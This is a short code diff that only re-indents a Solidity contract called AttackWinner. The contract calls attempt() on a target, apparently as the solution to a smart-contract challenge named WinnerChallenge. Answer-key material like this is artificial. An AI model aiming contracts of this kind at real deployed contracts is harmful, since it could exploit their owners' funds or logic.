@@ -11,10 +11,9 @@ contract WinnerChallenge {
 }
 
 contract AttackWinner {
-
-  function attack(address _target) public {
-      bytes memory payload = abi.encodeWithSignature("attempt()");
-    (bool ok,) = _target.call(payload);
-    require(ok);
-  }
+    function attack(address _target) public {
+        bytes memory payload = abi.encodeWithSignature("attempt()");
+        (bool ok,) = _target.call(payload);
+        require(ok);
+    }
 }
